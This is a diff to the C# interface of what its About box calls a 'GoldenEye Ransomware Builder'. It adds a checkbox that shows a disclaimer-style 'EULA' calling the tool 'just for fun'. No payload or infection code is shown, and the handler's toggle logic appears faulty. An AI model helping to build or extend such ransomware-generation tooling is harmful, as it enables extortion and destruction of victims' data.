@@ -347,5 +347,24 @@ namespace Petya_and_GoldenEye_BUILDER
         {
 			MessageBox.Show("GoldenEye Ransomware Builder\nVersion v1.0\nCreated by Hildaboo and modified by Vichingo455","About",MessageBoxButtons.OK,MessageBoxIcon.Information);
         }
+
+        private void checkBox1_CheckedChanged(object sender, EventArgs e)
+        {
+			if (checkBox1.Checked)
+            {
+				this.checkBox1.Checked = false;
+            }
+			else
+            {
+				if (MessageBox.Show("This program has been made just for fun.\nYou don't have to build the ransomware to infect other's PCs.\nThe author of this tool is not responsible for any damages or wrong uses. Continue?", "EULA", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
+				{
+					this.checkBox1.Checked = false;
+				}
+				else
+                {
+					this.checkBox1.Checked = true;
+                }
+			}
+        }
     }
 }
